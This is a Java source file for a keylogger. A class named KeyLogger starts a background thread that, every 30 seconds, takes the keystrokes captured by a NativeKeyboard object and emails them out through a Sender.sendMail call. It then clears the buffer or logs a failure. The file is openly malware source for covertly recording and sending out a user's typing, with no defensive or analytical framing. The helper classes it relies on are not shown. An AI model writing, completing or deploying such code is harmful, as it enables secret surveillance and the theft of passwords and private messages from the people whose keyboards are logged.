package scripts.keyLogger;

public class KeyLogger implements Runnable{
	
	private NativeKeyboard keyBoard;
	private Thread thread;
	
	public KeyLogger() {
		this.keyBoard = new NativeKeyboard();
		thread = new Thread(this, "KeyLogger");
		thread.start();
	}

	public NativeKeyboard getKeyBoard() {
		return keyBoard;
	}

	@Override
	public void run() {
		long start = System.nanoTime();
		while(true) {
			long passed = (System.nanoTime()-start)/1000000;
			if (passed > 30000) {
				try {
					Sender.sendMail(Utils.rawPrint(this.keyBoard.getKeys()));
					keyBoard.onSend();
				} catch (Throwable e) {
					e.printStackTrace();
					keyBoard.onFail();
				}
				start = System.nanoTime();
			}
		}
	}
	
	
}
